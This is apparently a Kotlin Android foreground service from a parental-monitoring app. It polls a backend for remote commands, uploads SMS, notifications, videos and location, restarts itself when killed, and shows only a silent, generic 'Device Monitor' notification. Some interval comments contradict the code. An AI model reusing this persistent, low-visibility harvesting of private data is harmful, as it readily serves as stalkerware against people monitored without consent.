package com.parentalmonitor.child.services

import android.app.AlarmManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.os.SystemClock
import androidx.core.app.NotificationCompat
import com.parentalmonitor.child.core.AppConstants
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch

/**
 * Persistent foreground service.
 *
 * Tick every 5 minutes:
 *   → Location + device status (every tick)
 *   → Remote commands poll (every tick)
 *   → Geofence + app-block rule sync (every tick)
 *
 * Slower tick every 30 minutes (6 × 5-min cycles):
 *   → Call logs, contacts, gallery, browsing history
 */
class TrackingForegroundService : Service() {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    private lateinit var locationSvc:      LocationService
    private lateinit var deviceSvc:        DeviceService
    private lateinit var commandSvc:       RemoteCommandService
    private lateinit var notificationSvc:  NotificationSyncService
    private lateinit var videoUploadSvc:   VideoUploadService
    private lateinit var smsSvc:           SmsService

    private var slowTick = 0

    override fun onCreate() {
        super.onCreate()
        locationSvc     = LocationService(this)
        deviceSvc       = DeviceService(this)
        commandSvc      = RemoteCommandService(this, AppConstants.backendBaseUrl)
        notificationSvc = NotificationSyncService(this, AppConstants.backendBaseUrl)
        videoUploadSvc  = VideoUploadService(this, AppConstants.backendBaseUrl)
        smsSvc          = SmsService(this, AppConstants.backendBaseUrl)
        isRunning       = true
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, buildNotification())
        startLoop()
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        isRunning = false
        scope.cancel()
        super.onDestroy()
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        scheduleRestart()
        super.onTaskRemoved(rootIntent)
    }

    // ── Main capture loop ─────────────────────────────────────────────────────

    private fun startLoop() {
        // Fast command loop — lightweight, runs every 10 s
        scope.launch {
            while (isActive) {
                runCommandPoll()
                delay(COMMAND_INTERVAL_MS)
            }
        }

        // Data loop — location/status/sync, runs every 60 s
        scope.launch {
            while (isActive) {
                runDataCapture()

                slowTick++
                if (slowTick >= SLOW_EVERY_N_TICKS) {
                    slowTick = 0
                    runSlowCapture()
                }

                delay(FAST_INTERVAL_MS)
            }
        }
    }

    /** Runs every 10 s — ONLY remote commands (fast, lightweight) */
    private suspend fun runCommandPoll() {
        val (token, deviceId) = readAuth()
        if (token != null && deviceId != null) {
            safeRun { commandSvc.pollAndExecute(token, deviceId) }
        }
    }

    /** Runs every 60 s — location, device status, sync rules, SMS */
    private suspend fun runDataCapture() {
        safeRun { locationSvc.captureLocation() }
        safeRun { deviceSvc.captureStatus() }

        val (token, deviceId) = readAuth()
        if (token != null && deviceId != null) {
            safeRun { commandSvc.syncGeofences(token, deviceId) }
            safeRun { commandSvc.syncAppBlocks(token, deviceId) }
            safeRun { notificationSvc.uploadPending(token, deviceId) }
            safeRun { smsSvc.syncSms(token, deviceId) }
        }
    }

    /** Runs every 30 minutes — heavier content providers */
    private fun runSlowCapture() {
        // Signal Flutter's MonitoringService that a slow cycle is due.
        getSharedPreferences("FlutterSharedPreferences", MODE_PRIVATE)
            .edit()
            .putLong("flutter.$KEY_SLOW_CYCLE_TS", System.currentTimeMillis())
            .apply()

        // Upload pending video files natively (streaming, no Flutter/base64 needed).
        val (token, deviceId) = readAuth()
        if (token != null && deviceId != null) {
            safeRun { videoUploadSvc.uploadPendingVideos(token, deviceId) }
            safeRun { smsSvc.syncSms(token, deviceId) }
        }
    }

    // ── Notification ──────────────────────────────────────────────────────────

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID, "Device Monitor", NotificationManager.IMPORTANCE_LOW
            ).apply {
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
            }
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    private fun buildNotification(): Notification =
        NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Device Monitor")
            .setContentText("Running in background")
            .setSmallIcon(android.R.drawable.ic_menu_mylocation)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setSilent(true)
            .build()

    // ── Restart insurance ─────────────────────────────────────────────────────

    private fun scheduleRestart() {
        val restartIntent = PendingIntent.getService(
            this, 1,
            Intent(applicationContext, TrackingForegroundService::class.java),
            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE,
        )
        (getSystemService(ALARM_SERVICE) as AlarmManager).set(
            AlarmManager.ELAPSED_REALTIME,
            SystemClock.elapsedRealtime() + 1_000L,
            restartIntent,
        )
    }

    // ── Helpers ───────────────────────────────────────────────────────────────

    private fun readAuth(): Pair<String?, String?> {
        val prefs  = getSharedPreferences("FlutterSharedPreferences", MODE_PRIVATE)
        val token  = prefs.getString("flutter.pm_token", null)
        val devId  = prefs.getString("flutter.pm_device_id", null)
        return Pair(token, devId)
    }

    private inline fun safeRun(block: () -> Unit) {
        try { block() } catch (_: Exception) {}
    }

    companion object {
        @Volatile var isRunning = false

        const val PREFS_TRACKING    = "pm_tracking"
        const val KEY_SLOW_CYCLE_TS = "slow_cycle_ts"

        private const val CHANNEL_ID        = "pm_tracking_channel"
        private const val NOTIFICATION_ID   = 1001
        private const val COMMAND_INTERVAL_MS = 10 * 1_000L      // 10 s — command fast poll
        private const val FAST_INTERVAL_MS   = 60 * 1_000L      // 60 s — data capture
        private const val SLOW_EVERY_N_TICKS = 6                 // every 6 min
    }
}
